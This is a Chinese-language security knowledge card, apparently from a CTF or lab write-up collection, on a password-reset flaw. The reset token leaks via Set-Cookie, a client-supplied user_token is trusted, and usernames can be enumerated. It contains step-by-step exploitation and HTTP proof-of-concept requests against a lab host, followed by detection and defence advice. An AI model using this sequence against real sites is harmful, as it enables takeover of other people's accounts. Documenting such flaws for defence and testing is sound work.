---
id: web-generic-auth-reset-token-setcookie-leak-user-token-param
title: 密码重置 token 经 Set-Cookie 回显 + 客户端 user_token 参数受信：任意用户改密接管
type: scenario
domain: web
path: web/generic/auth
technique: reset-token-setcookie-leak-client-param
aliases:
- user_token 泄露
- 密码重置 Set-Cookie 泄露 token
- 空 user_token 参数改密
- 任意用户密码重置
- 密码重置用户名枚举
tags:
- auth
- password-reset
- token-leak
- set-cookie
- account-takeover
- username-enumeration
- web
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V282
  verified_at: '2026-11-08T05:01:06+08:00'
  notes: 已对照原文与截图核对 Set-Cookie user_token 泄露、用户名枚举、reset.php/password_update.php 改密；未验证点：token 是否一次性/可重复使用原文未测试；dup-scan 相关 pair 为 related，保留本卡。
---

## 一句话结论

密码重置接口在“用户存在”时把服务端生成的 `user_token` 通过 `Set-Cookie` 回显给请求者，同时重置表单又信任客户端提交的 `user_token` 参数（默认空）；攻击者先枚举出存在的用户名（不同错误提示），从响应 `Set-Cookie` 取出该用户的 token，再把它填回请求参数并访问重置页，即可在不知道旧密码、也收不到邮件的情况下把任意用户密码改成自己的值，完成账号接管。

## 原理

- **token 生成与泄露**：服务端处理 `password_reset.php?user=gurag` 时生成一次性重置 token，本应只通过邮件发送，但却在同响应 `Set-Cookie: user_token=<64位hex>` 中返回。攻击者无需控制邮箱即可拿到 token。
- **客户端参数受信**：重置/更新接口接受请求中的 `user_token` 参数作为凭证，且未校验该 token 是否与当前会话、目标用户、请求来源绑定；空值也能进入流程。把泄露的 token 填入参数即被服务端当作合法重置凭证。
- **用户名枚举**：`user=admin` 返回 “Sorry, no user exists on our system with that username”，`user=gurag` 返回 “An email has been sent...”，两者差异暴露哪些账号存在，为定向重置提供目标。
- **重置流程缺少二次校验**：`password_update.php?user=gurag&password=gurag` 直接按 user 参数更新口令，不要求旧密码、邮箱验证码或登录态，token 校验一旦通过即改密。
- **为什么一次泄露就够**：token 在响应头中返回且可重复使用（未验证一次性/过期/绑定），攻击者拿到后可在自己的会话中完成重置；服务端把“谁请求重置”和“谁提交 token”解耦，形成 confused deputy。

## 触发条件

- 存在密码重置/忘记密码功能，且响应头或响应体回显重置 token；
- 重置确认/更新接口信任客户端提交的 token 参数，且未绑定会话/用户/邮箱；
- 可通过错误信息或响应差异枚举用户名；
- 目标账号可被重置（非 SSO/外部认证），且攻击者可访问重置页。

## 利用步骤

1. 访问 `password_reset.php?user=admin`，观察返回 “no user exists”，确认用户名枚举。
2. 访问 `password_reset.php?user=gurag`，在响应头拿到：
   ```http
   Set-Cookie: user_token=6d3728ce933f45e55add56f5995eb66525213f3cff65ab863f4e4061a0cc1d5053631aee94ad1cd0c434623908b083f2964e
   ```
3. 把该值填入请求参数（`user_token=<token>`），同时保留服务端下发的 Cookie，访问 `GET /reset.php`，页面返回重置表单而非错误。
4. 直接请求 `GET /password_update.php?user=gurag&password=gurag`（或提交重置表单），服务端返回 “Password successfully updated!”。
5. 用 `gurag:gurag` 登录目标账号，获取该账号权限/数据（本例拿到 flag）。
6. 若 token 绑定 Cookie，保持同一 Cookie 会话；若 token 一次性，需在重置请求前获取最新 token。

## PoC

```http
GET /password_reset.php?user=gurag&user_token= HTTP/1.1
Host: 10.200.69.31

HTTP/1.1 200 OK
Set-Cookie: user_token=6d3728ce...f2964e
Content-Type: text/html

An email has been sent to the email associated with your username
```

```http
GET /reset.php HTTP/1.1
Host: 10.200.69.31
Cookie: PHPSESSID=ugl6bl6m76u7djm0mmmluc5bpm; user_token=6d3728ce...f2964e

HTTP/1.1 200 OK
... <form>重置密码表单</form>
```

```http
GET /password_update.php?user=gurag&password=gurag HTTP/1.1
Host: 10.200.69.31
Cookie: PHPSESSID=...; user_token=6d3728ce...f2964e

HTTP/1.1 200 OK
Password successfully updated!
```

## 变体与关联

- **变体**：token 可能出现在响应体 JSON、跳转 URL、Referer、前端 JS、邮件头或日志中；也可通过 Host 头污染把重置链接指向攻击者域名。
- **变体**：token 可预测（时间戳/弱随机/用户名哈希）或不过期、不一次性，可离线爆破/重放。
- **变体**：若 token 绑定会话但会话可固定，可先固定受害者会话再触发重置；若重置接口按 user 参数更新，可结合用户名枚举批量接管。
- **关联**：[[web-generic-auth-flowise-forgot-password-temp-token-response-leak]]（响应体回显 tempToken 的同类 token 泄露）、[[web-generic-auth-password-reset-username-tampering]]（重置表单 username 可篡改）、[[web-generic-auth-email-change-no-verification-password-reset-takeover]]（改邮箱后重置）、[[web-generic-auth-password-reset-hash-low12-bruteforce]]（token/哈希强度不足）。

## 检测与防御

- **绝不回显 token**：重置 token 只通过邮件/短信发送，响应头/响应体/URL 中不得出现；统一返回“如果账号存在已发送邮件”，避免用户名枚举。
- **服务端绑定**：token 与用户 ID、会话、邮箱、过期时间、使用次数绑定；提交时校验全部字段，单次使用后立即失效；重置接口不信任 user 参数，用户身份从 token 解析。
- **流程加固**：重置前要求邮箱验证码/旧密码/MFA；重置后强制下线所有会话并通知用户；限制重置频率与 token 尝试次数。
- **检测**：监控同一 IP/会话对 `password_reset` 的高频不同用户名请求、响应中出现 `Set-Cookie: user_token`、token 参数与 Cookie 不一致、重置后立即登录等异常链；WAF 对 `user_token` 参数做长度/格式校验。
